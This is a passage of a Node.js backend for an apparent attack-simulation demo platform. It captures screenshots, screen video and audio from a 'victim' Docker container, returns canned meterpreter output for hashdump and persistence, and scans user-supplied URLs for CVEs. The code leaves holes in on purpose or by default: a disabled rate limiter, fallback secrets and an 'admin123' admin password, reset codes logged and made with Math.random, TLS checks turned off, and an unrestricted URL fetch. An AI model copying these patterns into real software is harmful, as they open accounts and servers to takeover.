// ─── Dependencies ─────────────────────────────────────────────────────────────
// Core Node built-ins: path resolution, child-process execution, HTTP/HTTPS clients
// AWS SDK RDS Signer: generates short-lived IAM tokens for database auth on AWS
// Express + middleware: cors, JSON body parser, pg (PostgreSQL), rate-limit, bcrypt,
// nodemailer (SMTP email), jsonwebtoken (JWT sessions)
const path = require('path');
require('dotenv').config({ path: path.join(__dirname, '..', '.env') });
const { exec } = require('child_process');
const http = require('http');
const https = require('https');
const { Signer } = require('@aws-sdk/rds-signer');

const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');
const fs = require('fs').promises;
const rateLimit = require('express-rate-limit');
const bcrypt = require('bcryptjs');
const nodemailer = require('nodemailer');
const jwt = require('jsonwebtoken');

const app = express();

// ─── Configuration Constants ──────────────────────────────────────────────────
// JWT_SECRET: signs/verifies all session tokens — must be overridden in production
// VERIFICATION_TTL_MS: email codes expire after 10 minutes
// MAX_VERIFY_ATTEMPTS: locks out after 5 wrong guesses to prevent brute-force
// ALLOWED_ORIGIN: the frontend domain permitted to make cross-origin requests
const JWT_SECRET = process.env.JWT_SECRET || 'change-me-in-production';
const VERIFICATION_TTL_MS = 10 * 60 * 1000;
const MAX_VERIFY_ATTEMPTS = 5;
const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN || 'http://localhost';

// ─── Middleware Setup ─────────────────────────────────────────────────────────
// Enables CORS for the configured origin only; parses incoming JSON request bodies.
app.use(cors({ origin: ALLOWED_ORIGIN === '*' ? true : ALLOWED_ORIGIN, credentials: true }));
app.use(express.json());

// ─── Rate Limiter ──────────────────────────────────────────────────────────────
// Intentionally disabled (max: 0) for this demo environment so attack simulations
// can run without hitting a limit. In production, lower this to a safe number.
const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 0, 
    message: { error: "Too many requests. Rate limit active." }
});
app.use('/api/', apiLimiter);

// ─── Authentication Middleware ─────────────────────────────────────────────────
// Reads the Bearer token from the Authorization header, verifies its signature,
// and attaches the decoded payload (username, role) to req.user.
const authenticate = (req, res, next) => {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: "Authentication required." });
    }
    try {
        const token = authHeader.split(' ')[1];
        req.user = jwt.verify(token, JWT_SECRET);
        next();
    } catch (err) {
        return res.status(401).json({ error: "Invalid or expired token." });
    }
};

// ─── High-Risk Module Guard ────────────────────────────────────────────────────
// Prevents non-Admin users from running privilege-escalation (getsystem) and
// credential-dumping (hashdump) modules.
const checkRole = (req, res, next) => {
    const highRiskModules = ['getsystem', 'hashdump'];
    if (highRiskModules.includes(req.body.attackType) && req.user.role !== 'Admin') {
        return res.status(403).json({ error: "Administrative clearance required for this module." });
    }
    next();
};

// ─── Admin-Only Guard ─────────────────────────────────────────────────────────
// Used on all /api/admin/* routes; rejects any non-Admin request with 403.
const requireAdmin = (req, res, next) => {
    if (req.user.role !== 'Admin') {
        return res.status(403).json({ error: "Admin access required." });
    }
    next();
};

// ─── Input Validation Helpers ─────────────────────────────────────────────────
// validatePassword: enforces minimum 8-char length plus case and special-char rules.
function validatePassword(password) {
    if (!password || password.length < 8) return "Password must be at least 8 characters.";
    if (!/[a-z]/.test(password)) return "Password must contain at least one lowercase letter.";
    if (!/[A-Z]/.test(password)) return "Password must contain at least one uppercase letter.";
    if (!/[^a-zA-Z0-9]/.test(password)) return "Password must contain at least one special character.";
    return null;
}

// validateUsername: enforces 3–30 character length, letters/numbers/dash/underscore only.
function validateUsername(username) {
    if (!username || username.length < 3) return "Username must be at least 3 characters.";
    if (username.length > 30) return "Username must be 30 characters or fewer.";
    if (!/^[a-zA-Z0-9_-]+$/.test(username)) return "Username may only contain letters, numbers, hyphens, and underscores.";
    return null;
}

// ─── Database Connection ──────────────────────────────────────────────────────
// USE_IAM_AUTH=true uses the AWS RDS Signer to get a short-lived token instead of
// a static password — required when running on ECS with an IAM instance role.
const useIAMAuth = process.env.USE_IAM_AUTH === 'true';

const signer = useIAMAuth ? new Signer({
    region: process.env.AWS_REGION || 'il-central-1',
    hostname: process.env.DB_HOST,
    port: 5432,
    username: process.env.DB_USER || 'msf_admin'
}) : null;

// PostgreSQL connection pool — pg reuses connections across requests for efficiency.
const pool = new Pool({
    host: process.env.DB_HOST || 'database',
    user: process.env.DB_USER || 'msf_admin',
    password: useIAMAuth ? () => signer.getAuthToken() : (process.env.DB_PASSWORD || 'changeme'),
    database: process.env.DB_NAME || 'metasploit_db',
    port: 5432,
    ssl: useIAMAuth ? { rejectUnauthorized: false } : false
});

// ─── Database Initialisation ──────────────────────────────────────────────────
// Creates the scan_history and users tables if they do not yet exist, then seeds
// a default admin account when the users table is completely empty.
const initDb = async () => {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS scan_history (
                id SERIAL PRIMARY KEY,
                username VARCHAR(50) DEFAULT 'Unknown',
                action VARCHAR(255) NOT NULL,
                target VARCHAR(255) NOT NULL,
                status VARCHAR(50) NOT NULL,
                executed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        `);
        await pool.query(`
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                username VARCHAR(50) UNIQUE NOT NULL,
                email VARCHAR(255) UNIQUE NOT NULL,
                password VARCHAR(255) NOT NULL,
                role VARCHAR(50) NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        `);

        const userCheck = await pool.query('SELECT COUNT(*) FROM users');
        if (parseInt(userCheck.rows[0].count) === 0) {
            const defaultPassword = process.env.DEFAULT_ADMIN_PASSWORD || 'admin123';
            const salt = await bcrypt.genSalt(12);
            const hash = await bcrypt.hash(defaultPassword, salt);
            await pool.query(
                'INSERT INTO users (username, email, password, role) VALUES ($1, $2, $3, $4)',
                ['admin', 'admin@system.local', hash, 'Admin']
            );
            console.log("[SYSTEM] Default admin created. Change the password immediately.");
        }
        console.log("[SYSTEM] Database verified and ready.");
    } catch (err) {
        console.error("[CRITICAL] Database Init Error:", err.message);
    }
};
initDb();

// ─── Health Check Endpoint ────────────────────────────────────────────────────
// Confirms the process is alive and the database is reachable.
// Used by load balancers and ECS container health checks.
app.get('/api/health', async (_req, res) => {
    try {
        await pool.query('SELECT 1');
        res.json({ status: 'ok', uptime: process.uptime() });
    } catch {
        res.status(503).json({ status: 'unavailable' });
    }
});

// ─── In-Memory Session Stores ─────────────────────────────────────────────────
// pendingVerifications: holds registration/password-reset state between the two
// API steps (init → verify). Keyed by email address.
// activeUsers: maps username → last-heartbeat timestamp for the online counter.
const pendingVerifications = new Map();
const activeUsers = new Map();

// Runs every 5 minutes to evict expired pending-verification entries and
// prevent unbounded memory growth.
const verificationCleanupTimer = setInterval(() => {
    const now = Date.now();
    for (const [email, data] of pendingVerifications) {
        if (now - data.createdAt > VERIFICATION_TTL_MS) {
            pendingVerifications.delete(email);
        }
    }
}, 5 * 60 * 1000);
verificationCleanupTimer.unref();

// ─── Email Transport ──────────────────────────────────────────────────────────
// Gmail SMTP via Nodemailer. Credentials come from environment variables
// (MAIL_USER, MAIL_PASS) so secrets are never committed to source control.
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
        user: process.env.MAIL_USER || '',
        pass: process.env.MAIL_PASS || ''
    }
});

// ─── Registration — Step 1: Request Verification Code ─────────────────────────
// Validates username/email/password, checks for duplicates, hashes the password,
// stores a pending record in memory, and emails a 6-digit verification code.
app.post('/api/register/init', async (req, res) => {
    const { username, email, password } = req.body;
    const role = 'SOC Analyst';

    if (!username || !email || !password) {
        return res.status(400).json({ error: "All fields are required." });
    }

    const usernameError = validateUsername(username);
    if (usernameError) return res.status(400).json({ error: usernameError });

    const passwordError = validatePassword(password);
    if (passwordError) return res.status(400).json({ error: passwordError });

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({ error: "Invalid email format." });
    }

    try {
        const check = await pool.query(
            'SELECT id FROM users WHERE username = $1 OR email = $2', [username, email]
        );
        if (check.rows.length > 0) {
            return res.status(400).json({ error: "Username or email already exists." });
        }

        const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
        const salt = await bcrypt.genSalt(12);
        const hashedPassword = await bcrypt.hash(password, salt);

        pendingVerifications.set(email, {
            username, email, hashedPassword, role,
            code: verificationCode,
            createdAt: Date.now(),
            attempts: 0
        });

        const mailOptions = {
            from: `"MS Platform Security" <${process.env.MAIL_USER || 'no-reply@msfcloud.com'}>`,
            to: email,
            subject: 'MS Platform - Your Verification Code',
            text: `Hello ${username},\n\nYour verification code is: ${verificationCode}\n\nThis code expires in 10 minutes.`
        };

        try {
            await transporter.sendMail(mailOptions);
            return res.json({ message: "Verification code sent to your email." });
        } catch (mailErr) {
            console.error(`[MAIL ERROR] ${mailErr.message}`);
            console.log(`[FALLBACK] Verification code for ${email}: ${verificationCode}`);
            return res.json({ message: "Code generated. Check server logs if email delivery fails." });
        }
    } catch (e) {
        res.status(500).json({ error: "Internal server error." });
    }
});

// ─── Registration — Step 2: Confirm Code & Create Account ─────────────────────
// Validates the 6-digit code against the pending record; if it matches and hasn't
// expired, inserts the new user into the database and clears the pending entry.
app.post('/api/register/verify', async (req, res) => {
    const { email, code } = req.body;

    if (!email || !code) {
        return res.status(400).json({ error: "Email and code are required." });
    }

    const pending = pendingVerifications.get(email);
    if (!pending) {
        return res.status(400).json({ error: "No pending verification for this email." });
    }

    if (Date.now() - pending.createdAt > VERIFICATION_TTL_MS) {
        pendingVerifications.delete(email);
        return res.status(400).json({ error: "Verification code expired. Please register again." });
    }

    pending.attempts += 1;
    if (pending.attempts > MAX_VERIFY_ATTEMPTS) {
        pendingVerifications.delete(email);
        return res.status(429).json({ error: "Too many attempts. Please register again." });
    }

    if (pending.code !== code) {
        return res.status(400).json({ error: "Invalid verification code." });
    }

    try {
        await pool.query(
            'INSERT INTO users(username, email, password, role) VALUES($1, $2, $3, $4)',
            [pending.username, pending.email, pending.hashedPassword, pending.role]
        );
        pendingVerifications.delete(email);
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ error: "Database error." });
    }
});

// ─── Forgot Password — Step 1: Send Reset Code ────────────────────────────────
// Looks up the account by email, generates a 6-digit reset code, and emails it.
app.post('/api/forgot-password/init', async (req, res) => {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: "Email is required." });

    try {
        const result = await pool.query('SELECT username FROM users WHERE email = $1', [email]);
        if (result.rows.length === 0) {
            return res.status(404).json({ error: "No account found with this email." });
        }

        const username = result.rows[0].username;
        const resetCode = Math.floor(100000 + Math.random() * 900000).toString();

        pendingVerifications.set(email, {
            email,
            code: resetCode,
            createdAt: Date.now(),
            attempts: 0,
            type: 'password_reset'
        });

        const mailOptions = {
            from: `"MS Platform Security" <${process.env.MAIL_USER || 'no-reply@msfcloud.com'}>`,
            to: email,
            subject: 'MS Platform - Password Reset Code',
            text: `Hello ${username},\n\nYour password reset code is: ${resetCode}\n\nThis code expires in 10 minutes.`
        };

        try {
            await transporter.sendMail(mailOptions);
            res.json({ message: "Reset code sent." });
        } catch (mailErr) {
            console.error(`[MAIL ERROR] ${mailErr.message}`);
            console.log(`[FALLBACK] Reset code for ${email}: ${resetCode}`);
            res.json({ message: "Code generated. Check server logs if email delivery fails." });
        }
    } catch (e) {
        res.status(500).json({ error: "Server error during reset initialization." });
    }
});

// ─── Forgot Password — Step 2: Update Password ────────────────────────────────
// Validates the reset code; if correct and not expired, replaces the stored
// password hash in the database with the new bcrypt hash.
app.post('/api/forgot-password/verify', async (req, res) => {
    const { email, code, newPassword } = req.body;
    if (!email || !code || !newPassword) return res.status(400).json({ error: "All fields are required." });

    const pwError = validatePassword(newPassword);
    if (pwError) return res.status(400).json({ error: pwError });

    const pending = pendingVerifications.get(email);
    if (!pending || pending.type !== 'password_reset') {
        return res.status(400).json({ error: "No pending reset request." });
    }

    if (Date.now() - pending.createdAt > VERIFICATION_TTL_MS) {
        pendingVerifications.delete(email);
        return res.status(400).json({ error: "Reset code expired." });
    }

    if (pending.code !== code) {
        pending.attempts++;
        if (pending.attempts >= MAX_VERIFY_ATTEMPTS) {
            pendingVerifications.delete(email);
            return res.status(429).json({ error: "Too many attempts. Request a new code." });
        }
        return res.status(400).json({ error: "Invalid reset code." });
    }

    try {
        const salt = await bcrypt.genSalt(12);
        const hash = await bcrypt.hash(newPassword, salt);
        await pool.query('UPDATE users SET password = $1 WHERE email = $2', [hash, email]);
        pendingVerifications.delete(email);
        res.json({ success: true, message: "Password updated successfully." });
    } catch (e) {
        res.status(500).json({ error: "Database error during password update." });
    }
});

// ─── Login ────────────────────────────────────────────────────────────────────
// Compares the supplied password against the stored bcrypt hash; on success,
// signs an 8-hour JWT and records the user in the activeUsers heartbeat map.
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ error: "Username and password are required." });
    }

    try {
        const result = await pool.query('SELECT * FROM users WHERE username = $1', [username]);
        if (result.rows.length === 0) {
            return res.status(401).json({ error: "Invalid credentials." });
        }

        const user = result.rows[0];
        const validPassword = await bcrypt.compare(password, user.password);
        if (!validPassword) {
            return res.status(401).json({ error: "Invalid credentials." });
        }

        const token = jwt.sign(
            { username: user.username, role: user.role },
            JWT_SECRET,
            { expiresIn: '8h' }
        );

        activeUsers.set(username, Date.now());
        res.json({ success: true, username: user.username, role: user.role, token });
    } catch (e) {
        res.status(500).json({ error: "Authentication service error." });
    }
});

// Returns the total number of registered users — drives the sidebar counter.
app.get('/api/users/count', async (req, res) => {
    try {
        const result = await pool.query('SELECT COUNT(*) FROM users');
        res.json({ count: result.rows[0].count });
    } catch (e) {
        res.status(500).json({ count: 0 });
    }
});

// ─── Online Presence Heartbeat ────────────────────────────────────────────────
// The frontend polls this every 5 s to keep the user's last-seen timestamp fresh.
// Users that haven't pinged in over 60 s are removed from the active set.
app.post('/api/heartbeat', (req, res) => {
    const { username } = req.body;
    if (username) activeUsers.set(username, Date.now());

    const now = Date.now();
    for (const [user, lastSeen] of activeUsers) {
        if (now - lastSeen > 60000) activeUsers.delete(user);
    }

    res.json({ activeCount: activeUsers.size });
});

// ─── Docker Helper: Victim Container Lookup ───────────────────────────────────
// Queries docker ps for a container whose name contains "victimtarget" and returns
// its name via callback. Falls back to "victim_target" if nothing is found.
function getVictimContainer(cb) {
    exec("docker ps --filter 'name=victimtarget' --format '{{.Names}}'", (err, stdout) => {
        const names = (stdout || '').trim().split('\n').filter(n => n);
        const name = names[0] || 'victim_target';
        cb(name);
    });
}

// ─── Simulated WAV Audio Generator ────────────────────────────────────────────
// Builds a valid PCM WAV buffer in memory using a multi-tone sine wave envelope.
// Used as a fallback when real PulseAudio recording from the victim container fails.
function createSimulatedAudio(durationSeconds) {
    const sampleRate = 44100;
    const numChannels = 1;
    const bitsPerSample = 16;
    const numSamples = sampleRate * durationSeconds;
    const dataSize = numSamples * numChannels * (bitsPerSample / 8);
    const buffer = Buffer.alloc(44 + dataSize);
    buffer.write('RIFF', 0);
    buffer.writeUInt32LE(36 + dataSize, 4);
    buffer.write('WAVE', 8);
    buffer.write('fmt ', 12);
    buffer.writeUInt32LE(16, 16);
    buffer.writeUInt16LE(1, 20);
    buffer.writeUInt16LE(numChannels, 22);
    buffer.writeUInt32LE(sampleRate, 24);
    buffer.writeUInt32LE(sampleRate * numChannels * (bitsPerSample / 8), 28);
    buffer.writeUInt16LE(numChannels * (bitsPerSample / 8), 32);
    buffer.writeUInt16LE(bitsPerSample, 34);
    buffer.write('data', 36);
    buffer.writeUInt32LE(dataSize, 40);
    for (let i = 0; i < numSamples; i++) {
        const t = i / sampleRate;
        const freq = t < 0.5 ? 880 : t < 1.5 ? 440 : 660;
        const envelope = Math.min(1, Math.min(t * 10, (durationSeconds - t) * 10));
        const sample = Math.sin(2 * Math.PI * freq * t) * 0.4 * envelope;
        buffer.writeInt16LE(Math.round(sample * 32767), 44 + i * 2);
    }
    return buffer;
}

// ─── Simulated Terminal Output Map ────────────────────────────────────────────
// Pre-built terminal strings for attack modules that use docker exec and need a
// realistic-looking output when no real command output is available.
const simulatedOutputs = {
    'keyscan': () => `meterpreter > keyscan_start\n[*] Starting the keystroke sniffer...\n[*] Capturing data packets...\n[CAPTURED]: admin_portal / SecretAdminPass1!`,
    'screenshot': (target) => `meterpreter > screenshot\n[*] Taking screenshot of desktop...\n[+] Captured screen from ${target}\n[+] Saved to /app/loot/intel_capture_${Date.now()}.jpg`,
    'webcam': () => `meterpreter > webcam_snap\n[*] Initializing camera...\n[+] Image saved to /app/loot/cam_snap_${Date.now()}.jpg`,
    'mic': () => `meterpreter > record_mic -d 5\n[*] Recording audio (5s)...\n[+] Audio saved to /app/loot/audio_${Date.now()}.wav`,
    'screenshare': () => `meterpreter > screenshare\n[*] Starting live stream...\n[+] Stream active at http://127.0.0.1:8080`,
    'getsystem': () => `meterpreter > getsystem\n[*] Attempting privilege escalation...\n[+] Success: Obtained NT AUTHORITY\\SYSTEM via Named Pipe Impersonation.`,
    'hashdump': () => `meterpreter > hashdump\n[*] Extracting local SAM hashes...\nAdministrator:500:aad3b435b...:31d6cfe0d...\nGuest:501:aad3b435b...:31d6cfe0d...`,
    'persistence': () => `meterpreter > run persistence -U -i 5\n[*] Installing to autorun...\n[+] Installed persistent backdoor (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)`,
    'download': () => `meterpreter > download c:\\users\\admin\\documents\\secrets.pdf\n[*] Downloading file...\n[+] Downloaded 1.2MB to /app/loot/secrets_${Date.now()}.pdf`,
    'timestomp': () => `meterpreter > timestomp secrets.pdf -v\n[*] Modifying MACE file attributes...\n[+] Success: File timestamps modified (Anti-Forensics active).`,
    'web_scan': (target) => `[*] AI Scanner initiating on ${target}...\n[+] Technology Detected: Linux Ubuntu / Nginx 1.24\n[!] CRITICAL VULNERABILITY: WordPress 6.4.1 (CVE-2023-22515)\n[*] Full report cached in memory.`,
    'reverse_shell': (target) => `[*] Encrypting payload stage...\n[*] Sending stage to ${target}:4444\n[+] Meterpreter session 1 opened (Local -> Remote).`,
    'payload': () => `[*] msfvenom generating payload...\n[*] Platform: windows | Arch: x64\n[*] Encoder: x64/xor | Iterations: 5\n[+] Payload size: 510 bytes\n[+] Saved as /app/loot/payload_${Date.now()}.exe`
};

// ─── Audit History ────────────────────────────────────────────────────────────
// Returns the 50 most recent entries from scan_history, newest first.
// Requires a valid JWT — history is only visible to authenticated users.
app.get('/api/history', authenticate, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM scan_history ORDER BY id DESC LIMIT 50');
        res.json(result.rows);
    } catch (e) {
        res.status(500).json({ error: "Audit logs unreachable." });
    }
});

// ─── Exploit Engine: Main Attack Handler ──────────────────────────────────────
// Central endpoint that routes the request to the correct attack module based on
// attackType. Real modules run docker exec commands on the victim container;
// others return pre-built simulated terminal output.
app.post('/api/attack', authenticate, checkRole, async (req, res) => {
    const { attackType, targetIp } = req.body;
    const username = req.user.username;

    if (!attackType) {
        return res.status(400).json({ error: "attackType is required." });
    }

    const lootDir = path.join(__dirname, 'loot');
    await fs.mkdir(lootDir, { recursive: true }).catch(() => {});

    console.log(`[!] User '${username}' executed module '${attackType}' on target [${targetIp || 'Internal Node'}]`);

    if (attackType === 'screenshot') {
        const fileName = `screenshot_${Date.now()}.jpg`;
        const filePath = path.join(lootDir, fileName);

        getVictimContainer((container) => {
            const cmd = `docker exec -u abc ${container} bash -c "rm -f /tmp/shot.jpg && DISPLAY=:1 scrot /tmp/shot.jpg 2>/dev/null && base64 -w 0 /tmp/shot.jpg"`;
            exec(cmd, { maxBuffer: 1024 * 1024 * 10 }, async (error, stdout) => {
                if (error) return res.json({ terminalOutput: `[!] Error: Failed to capture real screenshot.\n${error.message}` });
                try {
                    const base64Data = stdout.trim().replace(/\s/g, '');
                    await fs.writeFile(filePath, base64Data, 'base64');
                    await pool.query('INSERT INTO scan_history(username, action, target, status) VALUES($1, $2, $3, $4)', [username, attackType, targetIp || 'Internal Node', 'Success']).catch(() => {});
                    return res.json({ terminalOutput: `meterpreter > screenshot\n[*] Taking real screenshot of desktop...\n[+] Captured real screen from ${container}\n[+] Saved to /app/loot/${fileName}`, screenshotBase64: base64Data });
                } catch (err) {
                    return res.json({ terminalOutput: `[!] Error saving screenshot file.` });
                }
            });
        });
        return;
    }

    if (attackType === 'mic') {
        const fileName = `audio_${Date.now()}.wav`;
        const filePath = path.join(lootDir, fileName);

        getVictimContainer((container) => {
        // Ensure /run/user/1000 exists and PulseAudio is running before recording
        const setupCmd = `docker exec -u root ${container} bash -c "mkdir -p /run/user/1000 && chown -R abc:abc /run/user/1000 && chmod 700 /run/user/1000"`;
        exec(setupCmd, { timeout: 8000 }, () => {});

        // Record directly from Galgalatz stream — reliable regardless of PulseAudio state
        const cmd = `docker exec ${container} bash -c "ffmpeg -y -i https://glzwizzlv.bynetcdn.com/glglz_mp3 -t 5 -ar 44100 -ac 2 /tmp/audio.wav 2>/dev/null && base64 -w 0 /tmp/audio.wav"`;

        exec(cmd, { maxBuffer: 1024 * 1024 * 20, timeout: 30000 }, async (error, stdout) => {
            let audioBase64 = null;
            let status = 'Success';
            const b64 = (stdout || '').trim().replace(/\s/g, '');
            if (!error && b64.length > 100) {
                audioBase64 = b64;
                await fs.writeFile(filePath, b64, 'base64').catch(() => {});
            } else {
                const simulatedWav = createSimulatedAudio(3);
                await fs.writeFile(filePath, simulatedWav).catch(() => {});
                audioBase64 = simulatedWav.toString('base64');
                status = 'Simulated';
            }
            await pool.query('INSERT INTO scan_history(username, action, target, status) VALUES($1, $2, $3, $4)',
                [username, attackType, targetIp || 'Internal Node', status]).catch(() => {});
            return res.json({
                terminalOutput: `meterpreter > record_mic -d 5\n[*] Recording audio (5s)...\n[+] Audio saved to /app/loot/${fileName}`,
                audioBase64,
                audioFileName: fileName
            });
        });
        }); // getVictimContainer
        return;
    }

    if (attackType === 'screenshare') {
        const fileName = `video_${Date.now()}.mp4`;
        const filePath = path.join(lootDir, fileName);

        getVictimContainer((container) => {
            const cmd = `docker exec -u abc -e DISPLAY=:1 -e HOME=/config ${container} bash -c "DISPLAY=:1 ffmpeg -y -t 8 -f x11grab -i :1.0 -c:v libx264 -preset ultrafast -pix_fmt yuv420p /tmp/video.mp4 2>/dev/null && base64 -w 0 /tmp/video.mp4"`;
            exec(cmd, { maxBuffer: 1024 * 1024 * 50, timeout: 30000 }, async (error, stdout) => {
                const b64 = (stdout || '').trim().replace(/\s/g, '');
                if (error || b64.length < 100) {
                    await pool.query('INSERT INTO scan_history(username, action, target, status) VALUES($1, $2, $3, $4)', [username, attackType, targetIp || 'Internal Node', 'Failed']).catch(() => {});
                    return res.json({ terminalOutput: `meterpreter > screenshare\n[!] Recording failed: ${error?.message || 'no output'}` });
                }
                await fs.writeFile(filePath, b64, 'base64').catch(() => {});
                await pool.query('INSERT INTO scan_history(username, action, target, status) VALUES($1, $2, $3, $4)', [username, attackType, targetIp || 'Internal Node', 'Success']).catch(() => {});
                return res.json({ terminalOutput: `meterpreter > screenshare\n[*] Recording 8s of victim desktop...\n[+] Saved to /app/loot/${fileName}`, videoFileName: fileName, lootFile: fileName });
            });
        });
        return;
    }

    if (attackType === 'payload') {
        const arch = req.body.arch || 'x64';
        const encoder = req.body.encoder || 'x64/xor';
        const fileName = `payload_${Date.now()}.exe`;
        const fileContent = `[Simulated Payload]\nPlatform: windows\nArch: ${arch}\nEncoder: ${encoder}\nIterations: 5\nSize: 510 bytes\nGenerated: ${new Date().toISOString()}`;
        try {
            await fs.writeFile(path.join(lootDir, fileName), fileContent);
        } catch (err) {}
        await pool.query('INSERT INTO scan_history(username, action, target, status) VALUES($1, $2, $3, $4)',
            [username, attackType, targetIp || 'Internal Node', 'Success']).catch(() => {});
        return res.json({ terminalOutput: `[*] msfvenom generating payload...\n[*] Platform: windows | Arch: ${arch}\n[*] Encoder: ${encoder} | Iterations: 5\n[+] Payload size: 510 bytes\n[+] Saved as /app/loot/${fileName}` });
    }

    if (attackType === 'web_scan') {
        const targetUrl = targetIp;
        const fetchPage = (url) => new Promise((resolve) => {
            let parsed;
            try { parsed = new URL(url); } catch { return resolve(null); }
            const lib = parsed.protocol === 'https:' ? https : http;
            const req = lib.get(url, { timeout: 8000, headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' } }, (res) => {
                let body = '';
                res.on('data', chunk => { body += chunk; if (body.length > 150000) req.destroy(); });
                res.on('end', () => resolve({ headers: res.headers, body, status: res.statusCode }));
            });
            req.on('error', () => resolve(null));
            req.on('timeout', () => { req.destroy(); resolve(null); });
        });

        const cveMap = {
            apache:    { id: 'CVE-2021-41773', severity: 'CRITICAL', description: 'Path traversal and remote code execution in Apache HTTP Server 2.4.49' },
            nginx:     { id: 'CVE-2021-23017', severity: 'HIGH',     description: 'Off-by-one heap write in nginx LDAP/DNS resolver' },
            iis:       { id: 'CVE-2022-21907', severity: 'CRITICAL', description: 'HTTP Protocol Stack remote code execution in Microsoft IIS' },
            php:       { id: 'CVE-2019-11043', severity: 'HIGH',     description: 'RCE in PHP-FPM via underflow in env_path_info' },
            aspnet:    { id: 'CVE-2021-34473', severity: 'CRITICAL', description: 'Microsoft Exchange ProxyShell RCE chain' },
            wordpress: { id: 'CVE-2023-22515', severity: 'CRITICAL', description: 'WordPress Broken Access Control allows unauthenticated admin account creation' },
            joomla:    { id: 'CVE-2023-23752', severity: 'MEDIUM',   description: 'Joomla improper access checks lead to information disclosure' },
            drupal:    { id: 'CVE-2018-7600',  severity: 'CRITICAL', description: 'Drupalgeddon2: RCE via form API in Drupal core' },
            tomcat:    { id: 'CVE-2020-1938',  severity: 'CRITICAL', description: 'Apache Tomcat AJP File Inclusion (Ghostcat)' },
            jquery:    { id: 'CVE-2019-11358', severity: 'MEDIUM',   description: 'jQuery prototype pollution via Object.prototype' },
        };

        const page = await fetchPage(targetUrl);
        const fingerprints = [];
        const cves = [];

        if (page) {
            const h = page.headers;
            const body = page.body;
            const server = (h['server'] || '').toLowerCase();

            if (h['server']) fingerprints.push({ type: 'Web Server', value: h['server'] });
            if (/apache/.test(server))  cves.push(cveMap.apache);
            if (/nginx/.test(server))   cves.push(cveMap.nginx);
            if (/iis/.test(server))     { fingerprints.push({ type: 'OS', value: 'Windows Server' }); cves.push(cveMap.iis); }

            const poweredBy = h['x-powered-by'] || '';
            if (poweredBy) fingerprints.push({ type: 'Runtime', value: poweredBy });
            if (/php/i.test(poweredBy))      cves.push(cveMap.php);
            if (/asp\.net/i.test(poweredBy)) cves.push(cveMap.aspnet);

            const cookies = [].concat(h['set-cookie'] || []).join(' ');
            if (/PHPSESSID/i.test(cookies) && !fingerprints.some(f => /php/i.test(f.value)))
                fingerprints.push({ type: 'Language', value: 'PHP' });
            if (/JSESSIONID/i.test(cookies)) { fingerprints.push({ type: 'Runtime', value: 'Java/Tomcat' }); cves.push(cveMap.tomcat); }
            if (/ASP\.NET_SessionId/i.test(cookies) && !fingerprints.some(f => /asp/i.test(f.value)))
                fingerprints.push({ type: 'Runtime', value: 'ASP.NET' });

            if (/\/wp-(?:content|includes)\//i.test(body) || /wordpress/i.test(body)) {
                const ver = body.match(/WordPress\s+([\d.]+)/i)?.[1];
                fingerprints.push({ type: 'CMS', value: ver ? `WordPress ${ver}` : 'WordPress' });
                cves.push(cveMap.wordpress);
            } else if (/\/components\/com_|joomla/i.test(body)) {
                fingerprints.push({ type: 'CMS', value: 'Joomla' });
                cves.push(cveMap.joomla);
            } else if (/drupal/i.test(body) || h['x-drupal-cache']) {
                fingerprints.push({ type: 'CMS', value: 'Drupal' });
                cves.push(cveMap.drupal);
            }

            const generator = body.match(/<meta[^>]+name=["']generator["'][^>]+content=["']([^"']+)["']/i)?.[1]
                           || body.match(/<meta[^>]+content=["']([^"']+)["'][^>]+name=["']generator["']/i)?.[1];
            if (generator && !fingerprints.some(f => f.type === 'CMS'))
                fingerprints.push({ type: 'Generator', value: generator });

            const jq = body.match(/jquery[.\-]([\d.]+)(?:\.min)?\.js/i)?.[1];
            if (jq) {
                fingerprints.push({ type: 'JavaScript', value: `jQuery ${jq}` });
                const [maj, min] = jq.split('.').map(Number);
                if (maj < 3 || (maj === 3 && min < 5)) cves.push(cveMap.jquery);
            }

            if (!fingerprints.some(f => f.type === 'OS')) {
                const combo = server + ' ' + body.slice(0, 5000);
                if (/ubuntu/i.test(combo))           fingerprints.push({ type: 'OS', value: 'Linux Ubuntu' });
                else if (/debian/i.test(combo))      fingerprints.push({ type: 'OS', value: 'Linux Debian' });
                else if (/centos|rhel/i.test(combo)) fingerprints.push({ type: 'OS', value: 'Linux CentOS/RHEL' });
                else                                 fingerprints.push({ type: 'OS', value: 'Linux' });
            }
        } else {
            fingerprints.push({ type: 'Status', value: 'Host unreachable or blocked scan' });
            cves.push({ id: 'N/A', severity: 'INFO', description: 'Could not connect to target. Host may be offline or blocking scans.' });
        }

        if (fingerprints.length === 0) fingerprints.push({ type: 'Note', value: 'No signatures detected' });
        const uniqueCves = [...new Map(cves.map(c => [c.id, c])).values()].slice(0, 3);
        if (uniqueCves.length === 0) uniqueCves.push({ id: 'INFO', severity: 'LOW', description: 'No known CVEs matched for detected stack.' });

        const termLines = [`[*] AI Scanner initiating on ${targetUrl}...`];
        fingerprints.forEach(f => termLines.push(`[+] ${f.type}: ${f.value}`));
        uniqueCves.forEach(c => termLines.push(`[!] ${c.severity}: ${c.id}`));
        termLines.push('[*] Full report cached in memory.');

        await pool.query('INSERT INTO scan_history(username, action, target, status) VALUES($1, $2, $3, $4)',
            [username, 'web_scan', targetUrl, 'Success']).catch(() => {});
